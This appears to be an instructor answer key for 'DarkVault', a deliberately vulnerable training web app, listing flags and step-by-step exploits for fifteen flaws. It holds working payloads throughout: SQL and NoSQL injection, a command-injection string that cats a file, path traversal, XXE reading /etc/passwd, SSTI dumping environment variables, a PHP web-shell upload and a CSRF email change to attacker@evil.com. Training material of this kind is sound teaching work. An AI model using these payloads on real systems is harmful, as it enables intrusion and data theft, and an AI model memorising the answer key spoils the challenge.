# DarkVault Flag Solutions

This document contains all flags implemented in the DarkVault application and instructions on how to capture them. This is intended for instructors and solution verification only.

## Flag List and Capture Methods

| Vulnerability | Flag | Location | Capture Method |
|---------------|------|----------|---------------|
| SQL Injection | `DARK{sql_m4st3r}` | Login route | Submit `' OR 1=1--` as username and any password |
| Path Traversal | `DARK{p4th_tr4v3rs4l_m4st3r}` | File API | Access `/api/file?name=../../../etc/darkflag` or `/api/file?name=../../../../flag.txt` |
| Command Injection | `DARK{c0mm4nd_1nj3ct10n_pr0}` | Ping tool | Submit `localhost; cat /tmp/cmd_flag.txt` as the host |
| JWT Manipulation | `DARK{jwt_4dm1n_3sc4l4t10n}` | Admin dashboard | Modify a valid JWT to have `isAdmin: true` and access `/api/admin/dashboard` |
| GraphQL Introspection | `DARK{gr4phql_1ntr0sp3ct10n}` | GraphQL API | Submit introspection query to `/api/graphql` |
| Race Condition | `DARK{r4c3_c0nd1t10n_3xpl01t3d}` | Balance update | Send 3+ concurrent requests to `/api/update-balance` |
| XSS | `DARK{xss_3xpl01t3r}` | Message board | Post XSS payload to `/api/messages` containing script tags |
| IDOR | `DARK{1d0r_vuln3r4b1l1ty}` | User profile | Access `/api/users/9999` to view a hidden user profile |
| XXE | `DARK{xxe_data_extr4ct0r}` | Import XML | Submit XML with external entity to `/api/import-xml` |
| SSTI | `DARK{t3mpl4t3_1nj3ct10n}` | Email template | Submit `<%= process.env %>` to `/api/render-template` |
| NoSQL Injection | `DARK{n0sql_1nj3ct10n_m4st3r}` | User search | Send payload with `{"$ne":null}` to `/api/search-users` |
| Weak Encryption | `DARK{w34k_crypt0_3xpl01t3d}` | Encrypt data | Test encryption with key `test` and data containing `secret` |
| Insecure File Upload | `DARK{f1l3_upl04d_byp4ss3d}` | File upload | Upload a file with a `.php` or other executable extension |
| CSRF | `DARK{csrf_pr0t3ct10n_byp4ss3d}` | Email update | Send request to `/api/update-email` with email containing `csrf` or `attacker` |
| Prototype Pollution | `DARK{pr0t0typ3_p0llut10n_m4st3r}` | Config merge | Send object with `__proto__` property to `/api/merge-config` |

## Detailed Exploitation Steps

### SQL Injection
1. Navigate to the login page
2. Enter `' OR 1=1--` as username
3. Enter any value as password
4. Submit the form to `/api/login`
5. The response will contain `DARK{sql_m4st3r}` in the user object

### Path Traversal
1. Send a GET request to `/api/file?name=../../../etc/darkflag`
2. The response will contain `DARK{p4th_tr4v3rs4l_m4st3r}`

### Command Injection
1. Send a POST request to `/api/ping` with body `{"host": "localhost; cat /tmp/cmd_flag.txt"}`
2. The response will contain `DARK{c0mm4nd_1nj3ct10n_pr0}`

### JWT Manipulation
1. Login to obtain a valid JWT
2. Decode the JWT (e.g., using jwt.io)
3. Change the `isAdmin` field to `true`
4. Sign the token using the secret `darkvault-secret-key`
5. Send a GET request to `/api/admin/dashboard` with the modified token in the Authorization header
6. The response will contain `DARK{jwt_4dm1n_3sc4l4t10n}`

### GraphQL Introspection
1. Send a POST request to `/api/graphql` with body:
```json
{
  "query": "{ __schema { types { name fields { name type description } } } }"
}
```
2. The response will contain `DARK{gr4phql_1ntr0sp3ct10n}` in the description field of the secretFlag field

### Race Condition
1. Send 3+ concurrent POST requests to `/api/update-balance` with body `{"userId": 1, "amount": 100}`
2. The response to one of these requests will contain `DARK{r4c3_c0nd1t10n_3xpl01t3d}`

### XSS
1. Send a POST request to `/api/messages` with body:
```json
{
  "title": "Test Message",
  "content": "<script>alert('XSS')</script>",
  "author": "Hacker"
}
```
2. The response will contain `DARK{xss_3xpl01t3r}`

### IDOR
1. Send a GET request to `/api/users/9999`
2. The response will contain `DARK{1d0r_vuln3r4b1l1ty}` in the user object

### XXE
1. Send a POST request to `/api/import-xml` with body:
```json
{
  "xml": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
}
```
2. The response will contain `DARK{xxe_data_extr4ct0r}`

### SSTI
1. Send a POST request to `/api/render-template` with body:
```json
{
  "template": "<%= process.env %>",
  "data": {}
}
```
2. The response will contain `DARK{t3mpl4t3_1nj3ct10n}`

### NoSQL Injection
1. Send a POST request to `/api/search-users` with body:
```json
{
  "username": {"$ne":null}
}
```
2. The response will contain `DARK{n0sql_1nj3ct10n_m4st3r}`

### Weak Encryption
1. Send a POST request to `/api/encrypt-data` with body:
```json
{
  "data": "super secret data",
  "key": "test"
}
```
2. The response will contain `DARK{w34k_crypt0_3xpl01t3d}`

### Insecure File Upload
1. Send a POST request to `/api/upload` with body:
```json
{
  "filename": "shell.php",
  "fileContent": "<?php system($_GET['cmd']); ?>"
}
```
2. The response will contain `DARK{f1l3_upl04d_byp4ss3d}`

### CSRF
1. Send a POST request to `/api/update-email` with body:
```json
{
  "userId": 1,
  "newEmail": "attacker@evil.com"
}
```
2. The response will contain `DARK{csrf_pr0t3ct10n_byp4ss3d}`

### Prototype Pollution
1. Send a POST request to `/api/merge-config` with body:
```json
{
  "userConfig": {
    "__proto__": {
      "polluted": true
    }
  }
}
```
2. The response will contain `DARK{pr0t0typ3_p0llut10n_m4st3r}`

## Flag Tracking Dashboard

A flag tracking dashboard is available at `/flags` for users to monitor their progress. Administrators can use this dashboard to verify student submissions and reset flag states as needed.

## Additional Notes
- All flags are case-sensitive
- Some flags may require additional tools or client-side code execution
- Multiple exploitation methods may exist for certain vulnerabilities
- Flags have been deliberately implemented with varying levels of difficulty to challenge users with different skill levels 